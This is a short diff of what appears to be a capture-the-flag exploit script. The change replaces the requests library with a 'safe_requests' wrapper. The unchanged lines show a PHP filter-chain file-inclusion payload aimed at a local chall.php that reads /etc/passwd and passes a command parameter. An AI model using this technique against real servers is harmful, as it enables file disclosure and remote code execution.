@@ -1,4 +1,4 @@
-import requests
+from security import safe_requests
 
 url = "http://localhost:8000/chall.php"
 file_to_use = "/etc/passwd"
@@ -51,7 +51,7 @@ final_payload = f"php://filter/{filters}/resource={file_to_use}"
 with open('payload', 'w') as f:
     f.write(final_payload)
 
-r = requests.get(url, params={
+r = safe_requests.get(url, params={
     "0": command,
     "action": "include",
     "file": final_payload
